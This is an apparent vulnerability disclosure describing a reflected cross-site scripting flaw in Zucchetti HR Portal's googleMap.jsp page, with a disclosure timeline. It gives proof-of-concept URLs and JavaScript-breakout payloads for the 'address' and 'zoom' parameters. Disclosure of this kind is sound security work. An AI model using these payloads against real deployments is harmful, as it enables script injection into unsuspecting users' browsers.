# Zucchetti HR Portal - Vulnerability Disclosure

During a Customer engagement, we identified the use of [Zucchetti HR Portal](https://www.zucchetti.it/it/cms/soluzioni/software-hr-zucchetti/hr-core-platform/hr-portal/portale-hr-risorse-umane.html) (HRPortal sw release 26.01.00) within the target perimeter.

We conducted a black-box assessment, with no prior knowledge of the environment nor valid credentials. The analysis of the static resources allowed us to detect a JSP page that is vulnerable to a Reflected Cross-Site Scripting (XSS), that could be used by a threat actor to lure the end-user to execute arbitrary JavaScript code in their browser context.

## Table of contents

 * [1. Environment](#1-environment)
 * [2. Technical details](#2-technical-details)
   * [2.1. Reflected Cross-Site Scripting (XSS)](#21-reflected-cross-site-scripting-xss)
 * [3. Disclosure](#3-disclosure)

## 1. Environment

Test was performed on production environment on HR Portal sw release 26.01.00 as deployed by the customer. No credentials have been provided.

## 2. Technical details

### 2.1. Reflected Cross-Site Scripting (XSS)

A Reflected Cross-Site Scripting (XSS) exists in Zucchetti HR Portal sw release 26.01.00 on `/HRPortal/jsp/googleMap.jsp` endpoint due to improper validation of user supplied input in multiple fields, such as:
 * Address
 * Zoom

An unauthenticated attacker can inject arbitrary JavaScript code inside one of these parameters then lure the user to access the URL, allowing the attacker to execute arbitrary JavaScript code in the user browser context.

> **Note**: similar input validation could also be found in other variables (eg. W, H, pointer, key) but, due to environmental constraints (such as mixed-content protection) we were unable to provide a valid PoC.

#### Description

We were able to inject arbitrary JavaScript on multiple variables used by `/HRPortal/jsp/googleMap.jsp` endpoint. For example, with the following request we were able to inject js code in `address` variable:

```
http[s]:<redacted.com>/HRPortal/jsp/googleMap.jsp?h=100%&w=100%&key=&pointer=&zoom=15&address=canary%22,map);}alert('xss-gerico');function+test(){//
```

As you can see in the following screenshot:

![Reflected XSS payload on address field intercepted with Burp Suite](/img/1-Reflected-XSS-on-address-field-burp-intercept.png)

And this is the payload execution result:

![Reflected XSS payload execution on address field](/img/2-Reflected-XSS-payload-execution-on-address-field.png)

Payload used is the following:

```js
address=canary%22,map);}alert('xss-gerico');function+test(){//
```

With a different payload we can obtain JavaScript code execution using `zoom` parameter:

```
http[s]://<redacted.com>/HRPortal/jsp/googleMap.jsp?h=100%&w=100%&key=&pointer=&zoom=1};alert("gerico-xss");var+dontcare={foo:bar&address=123
```

As you can see in the following screenshot:

![Reflected XSS payload execution on zoom field](/img/3-Reflected-XSS-on-zoom-field-burp-intercept.png)

And this is the payload execution result:

![Reflected XSS payload execution on zoom field](/img/4-Reflected-XSS-payload-execution-on-zoom-field.png)

Payload used is the following:

```js
1};alert("gerico-xss");var+dontcare={foo:bar
```

## 3. Disclosure

We’ve decided to follow the industry standard 90+30 days responsible disclosure process; here’s the timeline:

 * **June 23, 2026**: Sent initial report to Zucchetti’s "Servizio Security Compliance" of "Area Suite HR Zucchetti" (security.compliance@zucchetti.it) with full technical details.
 * **June 23, 2026**: Zucchetti demands the signing of an agreement that prevents us from disclosing the discovered vulnerability.
 * **June 23, 2026**: We refuse to sign the agreement.

 No other communication with Zucchettti's security team.
